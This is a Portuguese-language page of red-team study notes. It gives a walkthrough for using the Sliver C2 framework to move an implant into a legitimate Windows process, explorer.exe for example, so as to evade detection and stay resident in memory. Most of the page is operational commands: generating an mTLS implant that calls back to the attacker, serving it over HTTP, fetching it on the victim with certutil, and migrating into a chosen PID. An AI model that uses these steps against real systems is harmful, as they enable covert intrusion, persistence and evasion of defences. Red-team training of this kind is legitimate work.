> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/sliver-c2/dedection-and-evasion/process-injection-migration.md).

# Process Injection / Migration

Objetivo

Mover o **implant do Sliver** de um processo suspeito para um processo legítimo, aumentando a **evasão em tempo de execução (runtime evasion)**.

* **Process Migration** → injetar o payload em outro processo
* Ajuda a:
  * Evitar detecção
  * Manter persistência na memória
  * Esconder atividade maliciosa

**Gerar payload**

```
generate --mtls <SEU_IP>:443 --os windows --arch amd64 --save /home/kali
```

**Transferir payload**

Exemplo com Python server + certutil:

```
python3 -m http.server 8000
```

Na vítima:

```
certutil.exe -urlcache -f http://<IP>:8000/implant.exe implant.exe
```

**Executar implant**

* Executar `.exe` no alvo
* Nova sessão aparece no Sliver

```
use <SESSION_ID>
```

**Listar processos**

```
ps
```

**Escolher processo alvo**

Bons candidatos:

* `explorer.exe`
* Processos legítimos
* Usuário logado
* Privilégios elevados

```
migrate -p <PID>
```
